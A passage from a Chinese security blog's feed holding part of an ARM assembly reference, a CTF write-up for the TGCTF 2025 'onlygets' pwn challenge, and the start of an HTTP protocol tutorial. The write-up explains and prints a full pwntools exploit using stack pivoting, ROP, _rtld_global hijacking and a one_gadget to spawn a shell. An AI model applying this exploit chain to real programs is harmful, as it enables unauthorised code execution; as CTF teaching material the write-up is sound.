Mode</td><td>异常模式，处理内存访问错误等异常情况。</td></tr><tr><td>0x17</td><td>IRQ Mode</td><td>中断请求模式，用于处理中断。</td></tr><tr><td>0x1B</td><td>FIQ Mode</td><td>快速中断模式，处理快速中断请求。</td></tr></tbody></table><h3 id="特殊寄存器"><a href="#特殊寄存器" class="headerlink" title="特殊寄存器"></a><strong>特殊寄存器</strong></h3><table><thead><tr><th>寄存器名称</th><th>描述</th></tr></thead><tbody><tr><td><strong>SPSR</strong></td><td>保存异常状态寄存器，在进入异常模式时保存 <code>CPSR</code> 的内容。</td></tr><tr><td><strong>FPSCR</strong></td><td>浮点状态控制寄存器，保存与浮点运算相关的状态。</td></tr></tbody></table><h3 id="ARMv8（64位，AArch64模式）："><a href="#ARMv8（64位，AArch64模式）：" class="headerlink" title="ARMv8（64位，AArch64模式）："></a><strong>ARMv8（64位，AArch64模式）</strong>：</h3><p>在ARMv8架构的64位模式（AArch64）中，寄存器传递参数的规则与32位有所不同。ARMv8增加了64位寄存器，并且使用 <code>X</code> 系列寄存器。</p><table><thead><tr><th>寄存器</th><th>角色</th></tr></thead><tbody><tr><td><strong>X0 - X7</strong></td><td>用于传递前八个参数（64位寄存器）。</td></tr><tr><td><strong>X8</strong></td><td>被保留作为系统调用的返回值或特殊用途。</td></tr><tr><td><strong>X9 - X15</strong></td><td>用于存储局部变量或暂时的数据。</td></tr><tr><td><strong>X16 - X18</strong></td><td>用于编译器生成的临时数据（调用约定中可以使用）。</td></tr><tr><td><strong>X19 - X28</strong></td><td>用于传递更多参数或存储局部变量。</td></tr><tr><td><strong>X29</strong></td><td>帧指针（FP），指向当前栈帧的基地址。</td></tr><tr><td><strong>X30</strong></td><td>链接寄存器（LR），保存返回地址。</td></tr></tbody></table><h2 id="ARM指令"><a href="#ARM指令" class="headerlink" title="ARM指令"></a>ARM指令</h2><h3 id="ARM指令类型"><a href="#ARM指令类型" class="headerlink" title="ARM指令类型"></a><strong>ARM指令类型</strong></h3><table><thead><tr><th>指令类型</th><th>示例</th><th>描述</th></tr></thead><tbody><tr><td><strong>数据处理</strong></td><td><code>ADD</code>, <code>SUB</code>, <code>MUL</code></td><td>算术操作，如加法、减法、乘法等。</td></tr><tr><td><strong>数据传输</strong></td><td><code>MOV</code>, <code>LDR</code>, <code>STR</code></td><td>数据加载和存储指令，如 <code>MOV</code> 传送数据，<code>LDR</code> 从内存加载数据，<code>STR</code> 存储数据。</td></tr><tr><td><strong>比较</strong></td><td><code>CMP</code>, <code>TST</code></td><td>比较两个寄存器的值并设置条件码，<code>CMP</code> 用于算术比较，<code>TST</code> 用于位与操作。</td></tr><tr><td><strong>分支</strong></td><td><code>B</code>, <code>BL</code>, <code>BX</code></td><td>跳转指令，<code>B</code> 为无条件跳转，<code>BL</code> 为带链接的跳转（函数调用），<code>BX</code> 用于跳转到指定寄存器的地址。</td></tr><tr><td><strong>条件执行</strong></td><td><code>ADDNE</code>, <code>SUBEQ</code></td><td>条件执行，指令后跟条件码，如 <code>NE</code>（不相等）、<code>EQ</code>（相等）。</td></tr><tr><td><strong>位操作</strong></td><td><code>AND</code>, <code>ORR</code>, <code>EOR</code></td><td>位操作指令，<code>AND</code> 为按位与，<code>ORR</code> 为按位或，<code>EOR</code> 为按位异或。</td></tr><tr><td><strong>移位</strong></td><td><code>LSL</code>, <code>LSR</code>, <code>ASR</code>, <code>ROR</code></td><td>移位指令，<code>LSL</code> 左移，<code>LSR</code> 右移，<code>ASR</code> 算术右移，<code>ROR</code> 循环右移。</td></tr><tr><td><strong>栈操作</strong></td><td><code>PUSH</code>, <code>POP</code></td><td>栈操作指令，<code>PUSH</code> 将数据压栈，<code>POP</code> 从栈中弹出数据。</td></tr></tbody></table><h3 id="常用指令描述"><a href="#常用指令描述" class="headerlink" title="常用指令描述"></a><strong>常用指令描述</strong></h3><table><thead><tr><th>指令</th><th>示例</th><th>描述</th></tr></thead><tbody><tr><td><strong>MOV</strong></td><td><code>MOV R0, #5</code></td><td>将常数 5 传送到寄存器 R0。</td></tr><tr><td><strong>ADD</strong></td><td><code>ADD R1, R2, R3</code></td><td>将 R2 和 R3 相加并将结果存储到 R1。</td></tr><tr><td><strong>SUB</strong></td><td><code>SUB R4, R5, #1</code></td><td>将 R5 减去常数 1，并将结果存储到 R4。</td></tr><tr><td><strong>LDR</strong></td><td><code>LDR R0, [R1]</code></td><td>从地址 <code>R1</code> 加载数据到寄存器 R0。</td></tr><tr><td><strong>STR</strong></td><td><code>STR R0, [R1]</code></td><td>将寄存器 R0 的值存储到地址 <code>R1</code>。</td></tr><tr><td><strong>CMP</strong></td><td><code>CMP R0, #10</code></td><td>比较 R0 和常数 10 的大小，设置条件码。</td></tr><tr><td><strong>B</strong></td><td><code>B label</code></td><td>无条件跳转到标签 <code>label</code>。</td></tr><tr><td><strong>BL</strong></td><td><code>BL function</code></td><td>调用函数 <code>function</code>，并保存返回地址到链接寄存器（LR）。</td></tr><tr><td><strong>BX</strong></td><td><code>BX R0</code></td><td>跳转到 R0 寄存器所指示的地址。</td></tr></tbody></table><h3 id="条件执行"><a href="#条件执行" class="headerlink" title="条件执行"></a><strong>条件执行</strong></h3><p>ARM汇编语言支持条件执行。每条指令可以根据上一条指令的条件码来决定是否执行。条件码包括：</p><table><thead><tr><th>条件码</th><th>描述</th></tr></thead><tbody><tr><td><strong>EQ</strong></td><td>相等</td></tr><tr><td><strong>NE</strong></td><td>不相等</td></tr><tr><td><strong>GT</strong></td><td>大于</td></tr><tr><td><strong>LT</strong></td><td>小于</td></tr><tr><td><strong>GE</strong></td><td>大于等于</td></tr><tr><td><strong>LE</strong></td><td>小于等于</td></tr></tbody></table><p>示例：</p><ul><li><code>ADDNE R0, R1, R2</code> — 如果 <code>R1</code> 和 <code>R2</code> 不相等，执行加法。</li><li><code>SUBEQ R3, R4, #5</code> — 如果相等，执行减法。</li></ul><h3 id="ARM汇编程序结构"><a href="#ARM汇编程序结构" class="headerlink" title="ARM汇编程序结构"></a><strong>ARM汇编程序结构</strong></h3><p>ARM汇编程序由多个部分组成，常见的有：</p><ol><li><strong>头部</strong>：包括宏定义、引入库文件等。</li><li><strong>数据部分</strong>：定义数据、字符串、常量等。</li><li><strong>代码部分</strong>：包括指令执行逻辑，使用标签、跳转等控制程序流程。</li></ol><p>例如：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">.global</span> _start<br><br><span class="hljs-symbol">.section</span> <span class="hljs-meta">.text</span><br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">MOV</span> <span class="hljs-built_in">R0</span>, <span class="hljs-number">#5</span>       <span class="hljs-comment">// 将 5 存入 R0</span><br>    <span class="hljs-keyword">MOV</span> <span class="hljs-built_in">R1</span>, <span class="hljs-number">#3</span>       <span class="hljs-comment">// 将 3 存入 R1</span><br>    <span class="hljs-keyword">ADD</span> <span class="hljs-built_in">R2</span>, <span class="hljs-built_in">R0</span>, <span class="hljs-built_in">R1</span>   <span class="hljs-comment">// R2 = R0 + R1，即 5 + 3 = 8</span><br>    <span class="hljs-keyword">MOV</span> <span class="hljs-built_in">R7</span>, <span class="hljs-number">#1</span>       <span class="hljs-comment">// 系统调用号，退出程序</span><br>    <span class="hljs-keyword">SWI</span> <span class="hljs-number">0</span>            <span class="hljs-comment">// 触发系统调用</span><br></code></pre></td></tr></table></figure><h3 id="堆栈操作"><a href="#堆栈操作" class="headerlink" title="堆栈操作"></a><strong>堆栈操作</strong></h3><p>在函数调用中，ARM使用堆栈来保存寄存器值、局部变量等。常见的堆栈指令：</p><table><thead><tr><th>指令</th><th>示例</th><th>描述</th></tr></thead><tbody><tr><td><strong>PUSH</strong></td><td><code>PUSH &#123;R0, R1, R2&#125;</code></td><td>将 R0、R1、R2 压入栈中。</td></tr><tr><td><strong>POP</strong></td><td><code>POP &#123;R0, R1, R2&#125;</code></td><td>从栈中弹出 R0、R1、R2。</td></tr></tbody></table><p>通过这些堆栈操作，程序可以在函数调用时保存现场，恢复现场。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">PUSH &#123;R0, R1, R2&#125;   // 压栈，R2 -&gt; R1 -&gt; R0<br>POP &#123;R0, R1, R2&#125;    // 弹栈，R0 -&gt; R1 -&gt; R2<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>TGCTF 2025 WP</title>
    <link href="/2025/04/15/TGCTF-2025-onlygets/"/>
    <url>/2025/04/15/TGCTF-2025-onlygets/</url>
    
    <content type="html"><![CDATA[<h1 id="TGCTF-2025-onlygets"><a href="#TGCTF-2025-onlygets" class="headerlink" title="TGCTF 2025 onlygets"></a>TGCTF 2025 onlygets</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>总体来说题目难度适中，后边有两道难题没写出来，还有一题当时唐了没想起来思路，特来记录一下</p><h2 id="0x2-onlygets"><a href="#0x2-onlygets" class="headerlink" title="0x2 onlygets"></a>0x2 onlygets</h2><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>这是一个大道至简的题，简到只有一个gets函数，比赛时候也是没写出来，今天看了一下午的官方wp学到了新姿势。</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416105435824.png" alt="image-20250416105435824"></p><p>常规的的栈溢出肯定打不出来了，没有任何输入函数调用</p><p>gdb调试一下看看栈信息，发现了栈中有_rtld_global和__libc_start_main+128，这时候就联想到了，利用__libc_start_main+128函数的一个调用链了</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416110001639.png" alt="image-20250416110001639"></p><p>在__libc_start_main+128出有这么一段代码，如果我们让rcx为libc的地址，劫持_rtld_global为我们想要的偏移，这样到add rcx ，[r14]就能到达我们想去的位置。</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416110443392.png" alt="image-20250416110443392"></p><h3 id="总结思路"><a href="#总结思路" class="headerlink" title="总结思路"></a>总结思路</h3><p>总体思路就是：</p><ol><li>劫持_rtld_global为我们想要的偏移</li><li>然后调用__libc_start_main+128</li></ol><p>说起来好像很简单的样子，实际上一点不难，我就调试了一下午而已(菜菜！！😭)</p><h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h3><h4 id="过程一-栈迁移"><a href="#过程一-栈迁移" class="headerlink" title="过程一  栈迁移"></a>过程一  栈迁移</h4><p>因为没有输出函数，所以我们没办法泄露栈地址，就没办法对栈进行操作，只能把栈迁移到我们可控的地址 — bss段，如果单纯的迁移到bss段，栈内信息都没了，所以这时候就要控制执行流到start函数，进行初始化信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span> + p64(bss_addr) + p64(read_addr)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br><br>payload = <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x10</span> + p64(bss_addr) + p64(start_addr)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br></code></pre></td></tr></table></figure><p>调试一下看看情况，成功迁移到bss段并进项栈信息初始化</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416112309264.png" alt="image-20250416112309264"></p><p>如果要对_rtld_global进项劫持，可以用pop rdi然后调用gets函数就能设置_rtld_global的值，但是如果我们直接进行覆盖，就会导致_rtld_global的值丢失，这样就达不到我们的目的，所以只能控制输入地址为_rtld_global下面的，先把下面的ROP布置好，然后再迁移回来，进项上面的ROP布置。</p><h4 id="过程二-布置ROP链1"><a href="#过程二-布置ROP链1" class="headerlink" title="过程二  布置ROP链1"></a>过程二  布置ROP链1</h4><p>如果要对_rtld_global进项劫持，可以用pop rdi然后调用gets函数就能设置_rtld_global的值，但是如果我们直接进行覆盖，就会导致_rtld_global的值丢失，这样就达不到我们的目的，所以只能控制输入地址为_rtld_global下面的，先把下面的ROP布置好，然后再迁移回来，进行上面的ROP布置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;c&#x27;</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0x601170</span>) + p64(read_addr)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br><br>payload = p64(call_gets) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x601110</span>) + p64(leave_ret)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br></code></pre></td></tr></table></figure><p>调试一下看看情况，可以看到成功布置了ROP链，同时我们实现了栈迁移回去的作用</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416113104741.png" alt="image-20250416113104741"></p><p>这个rbp设置有讲究，需要迁移到栈上信息为main函数的地方，这样执行流又被我们重新控制了</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416113424197.png" alt="image-20250416113424197"></p><h4 id="过程三-布置ROP链2"><a href="#过程三-布置ROP链2" class="headerlink" title="过程三  布置ROP链2"></a>过程三  布置ROP链2</h4><p>此时我们的栈情况是这样的，接下来就正常布置ROP链</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416113711061.png" alt="image-20250416113711061"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;e&#x27;</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0x601188</span>) + p64(ret_addr) * <span class="hljs-number">6</span> +  p64(pop_rdi)[:-<span class="hljs-number">2</span>]<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br></code></pre></td></tr></table></figure><p>这里的rbp设置和上面一个道理，因为调用的gets后面有leave_ret，所以还可以实现栈迁移，控制执行流到main</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416114047348.png" alt="image-20250416114047348"></p><h4 id="过程四-控制-rtld-global的值"><a href="#过程四-控制-rtld-global的值" class="headerlink" title="过程四 控制_rtld_global的值"></a>过程四 控制_rtld_global的值</h4><p>这个值选择也很有讲究，我就是调试的过程中，发现rbp比rsp地址低，有概率出现报错，所以我们直接选择下面空旷的bss段地址，这样设置rbp的地址不容易报错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p64(<span class="hljs-number">0x6012a0</span>)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br><br>payload = <span class="hljs-string">b&#x27;f&#x27;</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0x6012b0</span>) + p64(read_addr)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br><br></code></pre></td></tr></table></figure><h4 id="过程五-构造最终payload"><a href="#过程五-构造最终payload" class="headerlink" title="过程五 构造最终payload"></a>过程五 构造最终payload</h4><p>这个payload就是输入到_rtld_global控制的那个地址，也就是我们控制的0x6012a0，构造过程需要调试才知道原理，先粘贴出代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = (<br>    p64(-<span class="hljs-number">293</span> - libc.sym[<span class="hljs-string">&quot;gets&quot;</span>] + <span class="hljs-number">0xebd3f</span>) +<br>    p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + <br>    p64(csu_addr) +<br>    p64(<span class="hljs-number">0</span>) + <br>    p64(<span class="hljs-number">0x6012a8</span>) + <br>    p64(<span class="hljs-number">0x6011a8</span>) + <br>    p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <br>    p64(csucall_addr)<br>).ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0x601150</span>)  <span class="hljs-comment"># 填充 + 控制流劫持？</span><br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br></code></pre></td></tr></table></figure><p>我们通过csu技术，控制到 __libc_start_main+128</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416115917445.png" alt="image-20250416115917445"></p><p>r12寄存器为__libc_start_main+128地址 ， rbx必须为0，这样就能控制到__libc_start_main+128函数了，rbp的值设置为下面空旷bss段地址就行，因为其他函数要进行栈操作，不能不管rbp的值，如果为0，就会报错</p><p>这两个行代码就说明为什么要填充0xa0个，然后后面填充一个地址，这个地址是gets残留的上一个地址，因为下面还要对地址进行+8处理</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416121147895.png" alt="image-20250416121147895"></p><p>可以看到成功控制到one_gadget</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250416121400457.png" alt="image-20250416121400457"></p><h4 id="完整脚本"><a href="#完整脚本" class="headerlink" title="完整脚本"></a>完整脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwnpy <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>filename = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>url = <span class="hljs-string">&#x27;127.0.0.1:46671&#x27;</span><br>gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  b * 0x00000000004005F1</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>set_context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, timeout=<span class="hljs-number">5</span>)<br>p = pr(url = url , filename = filename , gdbscript = gdbscript)<br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>bss_addr = <span class="hljs-number">0x0000000000601200</span><br>read_addr = <span class="hljs-number">0x00000000004005E5</span><br>start_addr = <span class="hljs-number">0x0000000000400480</span><br>leave_ret = <span class="hljs-number">0x00000000004005FB</span><br>call_gets = <span class="hljs-number">0x00000000004005F1</span><br>pop_rdi = <span class="hljs-number">0x0000000000400663</span><br>ret_addr = <span class="hljs-number">0x00000000004005FC</span><br>csu_addr = <span class="hljs-number">0x000000000040065A</span><br>csucall_addr = <span class="hljs-number">0x0000000000400649</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span> + p64(bss_addr) + p64(read_addr)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br><br>payload = <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x10</span> + p64(bss_addr) + p64(start_addr)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br><br>payload = <span class="hljs-string">b&#x27;c&#x27;</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0x601170</span>) + p64(read_addr)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br><br>payload = p64(call_gets) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x601110</span>) + p64(leave_ret)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br><br>payload = <span class="hljs-string">b&#x27;e&#x27;</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0x601188</span>) + p64(ret_addr) * <span class="hljs-number">6</span> +  p64(pop_rdi)[:-<span class="hljs-number">2</span>]<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br><br>payload = p64(<span class="hljs-number">0x6012a0</span>)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br><br>pause()<br>payload = <span class="hljs-string">b&#x27;f&#x27;</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0x6012b0</span>) + p64(read_addr)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br><br>oggs = [<span class="hljs-number">0xebc81</span> , <span class="hljs-number">0xebc85</span> , <span class="hljs-number">0xebc88</span> , <span class="hljs-number">0xebce2</span> , <span class="hljs-number">0xebd38</span> , <span class="hljs-number">0xebd3f</span> , <span class="hljs-number">0xebd43</span>]<br><br>payload = (<br>    p64(-<span class="hljs-number">293</span> - libc.sym[<span class="hljs-string">&quot;gets&quot;</span>] + <span class="hljs-number">0xebd3f</span>) +<br>    p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + <br>    p64(csu_addr) +<br>    p64(<span class="hljs-number">0</span>) + <br>    p64(<span class="hljs-number">0x6012a8</span>) + <br>    p64(<span class="hljs-number">0x6011a8</span>) + <br>    p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <br>    p64(csucall_addr)<br>).ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0x601150</span>)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>方法方法是一种十分考验调试能力，对rbp控制能力的题，写下来收获挺多的。</p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP协议详细学习</title>
    <link href="/2025/04/14/HTTP%E5%8D%8F%E8%AE%AE%E8%AF%A6%E7%BB%86%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/04/14/HTTP%E5%8D%8F%E8%AE%AE%E8%AF%A6%E7%BB%86%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="HTTP-协议"><a href="#HTTP-协议" class="headerlink" title="HTTP 协议"></a>HTTP 协议</h1><h2 id="0x1-概念"><a href="#0x1-概念" class="headerlink" title="0x1 概念"></a>0x1 概念</h2><p>协议是指计算机通信网络中两台计算机之间进行通信所必须共同遵守的规定或规则，超文本传输协议(HTTP)是一种通信 协议，它允许将超文本标记语言(HTML)文档从W eb服务器传送到客户端的浏览器。<br>HTTP协议，即超文本传输协议(Hypertext transfer protocol)。是一种详细规定了浏览器和万维网(W W W &#x3D; World Wide Web)服务器之间互相通信的规则，通过因特网传送万维网文档的数据传送协议。<br>HTTP协议是用于从W W W 服务器传输超文本到本地浏览器的传送协议。它可以使浏览器更加高效，使网络传输减少。它 不仅保证计算机正确快速地传输超文本文档，还确定传输文档中的哪一部分，以及哪部分内容首先显示(如文本先于图 形)等。<br>HTTP是一个应用层协议，由请求和响应构成，是一个标准的客户端服务器模型。HTTP是一个无状态的协议。<br>在Internet中所有的传输都是通过TCP&#x2F;IP进行的。HTTP协议作为TCP&#x2F;IP模型中应用层的协议也不例外。HTTP协议通 常承载于TCP协议之上，有时也承载于TLS或SSL协议层之上，这个时候，就成了我们常说的HTTPS。如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/image-20250414165527851.png"></p><p><strong>HTTP默认的端口号为80，HTTPS的端口号为443。</strong></p><h2 id="0x2-特点"><a href="#0x2-特点" class="headerlink" title="0x2 特点"></a>0x2 特点</h2><p>HTTP（超文本传输协议）是用于在客户端和服务器之间传输超文本数据的协议。它是Web通信的基础。以下是HTTP协议的几个关键特点：</p><ol><li><strong>无状态性</strong>：<ul><li>HTTP协议本身是无状态的，这意味着每次请求都是独立的，服务器不会记住之前的请求信息。每次请求都被视为独立的事务。</li></ul></li><li><strong>无连接性</strong>：<ul><li>HTTP协议在默认情况下是无连接的。在一个请求&#x2F;响应的过程中，客户端和服务器建立连接，处理完请求后连接就会关闭。这意味着每次请求都需要重新建立连接（虽然可以通过持久连接技术（如HTTP&#x2F;1.1中的Keep-Alive）来减少开销）。</li></ul></li></ol><p>“无状态”和“<code>Connection: keep-alive</code>”之间的区别</p><h3 id="1-无状态性（Stateless）："><a href="#1-无状态性（Stateless）：" class="headerlink" title="1. 无状态性（Stateless）："></a>1. <strong>无状态性（Stateless）</strong>：</h3><ul><li><strong>定义</strong>：HTTP协议本身是<strong>无状态</strong>的，这意味着每次请求都是独立的，服务器不保留任何前一个请求的信息。每次客户端发起请求时，服务器不会记住之前发生的任何事情。</li><li><strong>举例</strong>：当你在浏览器访问一个网站时，每次请求（比如访问网页、图片或提交表单）都是独立的，服务器不会记住你上一次请求的内容。即使是同一个用户，每次请求都不会携带之前请求的任何信息，除非使用额外的技术（如Session、Cookies）来保持状态。</li></ul><h3 id="2-Connection-keep-alive-："><a href="#2-Connection-keep-alive-：" class="headerlink" title="2. **Connection: keep-alive**："></a>2. **<code>Connection: keep-alive</code>**：</h3><ul><li><strong>定义</strong>：<code>Connection: keep-alive</code>是HTTP协议中一个头部字段，用来表示<strong>持久连接</strong>（Persistent Connection）。它使得在同一个TCP连接上，可以发送多个HTTP请求和响应，而不需要每次请求都重新建立连接。</li><li><strong>作用</strong>：通常情况下，在HTTP&#x2F;1.0中，每个请求&#x2F;响应都会建立一个新的TCP连接，并且在响应完成后立即关闭连接。而在HTTP&#x2F;1.1及其之后的版本中，默认启用了<code>Connection: keep-alive</code>，这意味着同一个连接可以复用进行多个请求和响应，直到连接超时或被显式关闭。</li><li><strong>举例</strong>：当你访问一个网页时，该网页可能包含多个资源（如CSS文件、JavaScript文件、图片等）。如果启用了<code>keep-alive</code>，所有这些资源请求可以通过同一个TCP连接完成，而无需每次都重新建立连接。</li></ul><h3 id="区别："><a href="#区别：" class="headerlink" title="区别："></a><strong>区别</strong>：</h3><ol><li><strong>无状态性</strong>：是指每个HTTP请求独立，服务器不会保存任何会话信息，客户端每次请求时需要提供所有必要的信息（如身份验证、参数等）。这与“保持连接”的概念不同，因为它强调的是请求之间的独立性，而不是连接的持续性。</li><li>**<code>Connection: keep-alive</code>**：是为了优化性能而设计的，它与无状态性并不冲突。<code>keep-alive</code>的目的是减少频繁建立连接的开销，提升响应速度和效率，尤其是在客户端发起多个请求的情况下。然而，它并不改变HTTP协议的无状态性质。即使在启用<code>keep-alive</code>时，每个请求依然是独立的，服务器不会记住前一个请求的上下文。</li></ol><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><ul><li><strong>无状态性</strong>指的是每个请求&#x2F;响应都是独立的，服务器不保存客户端的任何信息。</li><li>**<code>Connection: 